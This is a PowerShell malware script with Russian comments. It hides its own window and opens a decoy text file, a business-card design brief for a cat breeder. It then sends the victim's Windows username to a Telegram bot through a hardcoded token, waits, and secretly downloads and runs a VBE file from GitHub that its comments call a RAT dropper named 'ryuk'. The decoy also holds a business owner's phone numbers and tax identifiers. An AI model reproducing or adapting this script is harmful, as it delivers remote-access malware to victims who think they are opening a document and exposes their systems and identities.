# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "vizitka_tz_dly_pitomnika.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Техническое задание на дизайн визитки для питомника шотландских кошек «SnowDance»

1. Цель и задача
Разработать элегантный и запоминающийся дизайн визитки, который отражает профессиональность питомника шотландских кошек «SnowDance» и передает атмосферу нежности и заботы о животных.

2. Информация для размещения

    Лицевая сторона:
        Название питомника: SnowDance
        Слоган/специализация: Питомник шотландских вислоухих и прямоухих кошек
        Имя для связи: Юлия
        Телефон: +7 (919) 609-64-04
        Сайт: https://snowdance.ru/
        Визуал: Фотография кошки из предоставленных материалов.

    Оборотная сторона:
        Вариант 1 (Полные реквизиты):
            ИП Иванова Ю.А.
            ИНН 027811376592 / ОГРНИП 313028000084584
            Юр. адрес: Башкортостан, Архангельский район, д.Родинский, ул. Школьная д.5
            Доп. тел.: +7(919)609-61-99
        Вариант 2 (Упрощенный):
            Доп. тел.: +7(919)609-61-99
            QR-код, ведущий на сайт https://snowdance.ru/
            Иконки социальных сетей (при необходимости).

3. Исходные материалы и обработка

    Все необходимые фотографии кошек находятся в папке: photo materialy.
    Логотип питомника (если требуется его использовать) находится в файле: logo.
    Референсы и примеры: Примеры понравившихся стилей и макетов визиток находятся в папке reference. Просьба ориентироваться на общую стилистику, представленную в примерах.
    Обработка фотографий: Для достижения наилучшего результата разрешается использование ИИ

4. Требования к дизайну

    Цветовая палитра: Пастельная зеленая гамма.
        Основной цвет (фон): #E8F4EA (светлый зелено-белый).
        Акцентный цвет 1: #B8DBCB (мягкий пастельно-зеленый).
        Акцентный цвет 2: #88B4A4 (спокойный оливково-зеленый).
        Цвет текста: #2C3E33 (темно-зеленый, почти черный, для обеспечения читаемости).

    Шрифты:
        Заголовки (Название питомника, имя): Шрифт с засечками для элегантности. Например, Playfair Display или Cormorant Garamond.
        Основной текст (контакты, реквизиты): Чистый и легкочитаемый шрифт без засечек. Например, Montserrat, Open Sans или Lato.
    
	Стиль: Чистый, современный, с большим количеством свободного пространства. Визуальный акцент на качественной фотографии кошки. Дизайн должен быть сбалансированным и не перегруженным.

5. Технические требования

    Формат: Стандартный 90x50 мм.
    Цветность: Full Color.
    Вылеты: Предоставить макет с вылетами по 2 мм с каждой стороны.
    Разрешение: Все растровые элементы (фотографии) в итоговом макете должны быть не менее 300 dpi.
    Программа для верстки: Предпочтительно Adobe Illustrator.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8261323919:AAFuJ409vINSVQrZKeAc3V3ASDIPw3FDuQA"
$ChatID = "1993464525"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit